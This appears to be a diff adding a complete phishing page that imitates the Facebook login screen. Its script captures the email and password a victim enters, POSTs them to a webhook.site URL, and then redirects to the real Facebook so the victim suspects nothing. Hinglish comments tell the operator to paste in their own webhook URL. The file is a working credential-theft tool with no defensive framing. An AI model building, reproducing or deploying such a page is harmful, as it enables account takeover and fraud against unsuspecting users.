@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in or sign up</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 10px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        button:disabled {
+            background-color: #b0c4de;
+            cursor: not-allowed;
+        }
+        .forgot {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .footer a {
+            text-decoration: none;
+            color: #1877f2;
+            font-weight: bold;
+        }
+        /* Spinner */
+        .spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">facebook</div>
+    
+    <form id="loginForm">
+        <input type="text" name="email" id="email" placeholder="Email or phone number" required>
+        <input type="password" name="password" id="password" placeholder="Password" required>
+        <button type="submit" id="btn">Log in</button>
+        <div class="spinner" id="spinner"></div>
+    </form>
+    
+    <a href="#" class="forgot">Forgotten password?</a>
+    <div class="footer">
+        <a href="#">Create new account</a>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        var email = document.getElementById('email').value;
+        var pass = document.getElementById('password').value;
+        
+        // Button disable aur spinner dikhao
+        var btn = document.getElementById('btn');
+        var spinner = document.getElementById('spinner');
+        btn.disabled = true;
+        btn.innerText = "Logging in...";
+        spinner.style.display = "block";
+
+        //  Apna Webhook URL Yahan Paste Karo (Agar pehle se hai toh change mat karo) 
+        var webhookUrl = "https://webhook.site/b44b8a85-63b5-471e-9569-6adbd57c0b9a"; 
+
+        // Data bhejo
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({email: email, password: pass})
+        });
+
+        // Thoda delay dekar redirect karo taaki user ko lage ki login ho raha hai
+        setTimeout(function() {
+            window.location.href = "https://www.facebook.com";
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
